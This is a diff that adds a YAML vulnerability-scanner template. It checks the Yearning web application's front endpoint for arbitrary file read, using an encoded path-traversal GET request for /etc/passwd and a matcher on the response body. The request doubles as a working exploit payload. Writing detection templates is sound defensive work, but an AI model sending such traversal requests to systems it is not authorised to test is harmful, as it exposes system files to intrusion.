@@ -1,0 +1,19 @@
+id: yearning-front-readfile
+
+
+info:
+  name: Yearning front 接口任意文件读取
+  author: m0be1
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body,"root")
